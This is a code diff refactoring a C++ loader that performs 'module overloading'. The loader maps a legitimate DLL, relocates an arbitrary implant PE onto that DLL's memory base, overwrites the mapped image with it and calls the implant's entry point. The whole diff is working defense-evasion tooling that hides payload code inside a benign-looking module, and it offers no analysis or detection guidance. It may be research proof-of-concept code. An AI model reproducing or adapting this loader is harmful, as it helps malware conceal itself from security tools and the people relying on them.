@@ -70,7 +70,7 @@ bool overwrite_mapping(PVOID mapped, BYTE* implant_dll, size_t implant_size)
 	return is_ok;
 }
 
-void run_implant(PVOID mapped, DWORD ep_rva, bool is_dll)
+int run_implant(PVOID mapped, DWORD ep_rva, bool is_dll)
 {
 	ULONG_PTR implant_ep = (ULONG_PTR)mapped + ep_rva;
 
@@ -78,13 +78,51 @@ void run_implant(PVOID mapped, DWORD ep_rva, bool is_dll)
 	if (is_dll) {
 		//run the implant as a DLL:
 		BOOL(*dll_main)(HINSTANCE, DWORD, LPVOID) = (BOOL(*)(HINSTANCE, DWORD, LPVOID))(implant_ep);
-		dll_main((HINSTANCE)mapped, DLL_PROCESS_ATTACH, 0);
+		return dll_main((HINSTANCE)mapped, DLL_PROCESS_ATTACH, 0);
 	}
-	else {
-		//run the implant as EXE:
-		BOOL(*exe_main)(void) = (BOOL(*)(void))(implant_ep);
-		exe_main();
+	//run the implant as EXE:
+	BOOL(*exe_main)(void) = (BOOL(*)(void))(implant_ep);
+	return exe_main();
+}
+
+PVOID module_overloader(BYTE* raw_payload, size_t raw_size, char *target_dll)
+{
+	// Prepare the payload to be implanted:
+	// Convert payload from Raw to Virtual Format
+	size_t payload_size = 0;
+	BYTE* payload = peconv::load_pe_module(raw_payload, raw_size, payload_size, false, false);
+	if (!payload) {
+		std::cerr << "[-] Failed to convert the implant to virtual format!\n";
+		return NULL;
 	}
+	// Resolve the payload's Import Table
+	if (!peconv::load_imports(payload)) {
+		std::cerr << "[-] Loading imports failed!\n";
+		peconv::free_pe_buffer(payload);
+		return NULL;
+	}
+	// Prepare the target:
+	// Load the DLL that is going to be replaced:
+	PVOID mapped = load_target_dll(target_dll);
+	if (!mapped) {
+		return NULL;
+	}
+	// Relocate the payload into the target base:
+	if (!peconv::relocate_module(payload, payload_size, (ULONGLONG)mapped)) {
+		std::cerr << "[-] Failed to relocate the implant!\n";
+		return NULL;
+	}
+	// Implant the payload:
+	// Overwrite the target DLL with the payload
+#ifdef _DEBUG
+	std::cout << "[*] Trying to overwrite the mapped DLL with the implant!\n";
+#endif
+	if (!overwrite_mapping(mapped, payload, payload_size)) {
+		return NULL;
+	}
+	// Free the buffer that was used for the payload's preparation
+	peconv::free_pe_buffer(payload);
+	return mapped;
 }
 
 int main(int argc, char *argv[])
@@ -119,44 +157,37 @@ int main(int argc, char *argv[])
 
 	std::cout << "target_dll: " << dll_name << "\n";
 	std::cout << "implant_dll: " << implant_name << "\n";
+#ifdef _DEBUG
+	std::cerr << "[*] Loading the raw implant...\n";
+#endif
+	
+	size_t raw_size = 0;
+	BYTE *raw_payload = peconv::load_file(implant_name, raw_size);
 
-	PVOID mapped = load_target_dll(dll_name);
+#ifdef _DEBUG
+	std::cerr << "[+] Raw implant loaded\n";
+#endif
+	if (!is_compatibile(raw_payload)) {
+		system("pause");
+		return -1;
+	}
+	LPVOID mapped = module_overloader(raw_payload, raw_size, target_dll);
 	if (!mapped) {
-		system("pause");
-		return -1;
-	}
-	std::cerr << "[*] Loading the implant...\n";
-	size_t v_size = 0;
-	BYTE* implant_dll = peconv::load_pe_executable(implant_name, v_size);
-	if (!implant_dll) {
-		std::cerr << "[-] Failed to load the implant!\n";
-		system("pause");
-		return -1;
-	}
-	std::cerr << "[+] Implant loaded\n";
-	if (!is_compatibile(implant_dll)) {
+		std::cerr << "[ERROR] Module Overloading failed!\n";
 		system("pause");
 		return -1;
 	}
 
-	//relocate the module to the target base:
-	if (!peconv::relocate_module(implant_dll, v_size, (ULONGLONG)mapped, (ULONGLONG)implant_dll)) {
-		std::cerr << "[-] Failed to relocate the implant!\n";
-		system("pause");
-		return -1;
-	}
-	std::cout << "[*] Trying to overwrite the mapped DLL with the implant!\n";
-	if (!overwrite_mapping(mapped, implant_dll, v_size)) {
-		system("pause");
-		return -1;
-	}
-	std::cout << "[+] Copied!\n";
-	DWORD ep_rva = peconv::get_entry_point_rva(implant_dll);
-	bool is_dll = peconv::is_module_dll(implant_dll);
+	std::cout << "[+] Module Overloading finished...\n";
 
-	peconv::free_pe_buffer(implant_dll); implant_dll = NULL;
+	// Fetch the target's Entry Point
+	DWORD ep_rva = peconv::get_entry_point_rva(raw_payload);
+	bool is_dll = peconv::is_module_dll(raw_payload);
+	peconv::free_file(raw_payload); raw_payload = nullptr;
 
-	run_implant(mapped, ep_rva, is_dll);
+	// Run the payload:
+	int ret = run_implant(mapped, ep_rva, is_dll);
+	std::cout << "[+] Implant finished, ret: " << std::dec << ret << "\n";
 
 	system("pause");
 	return 0;
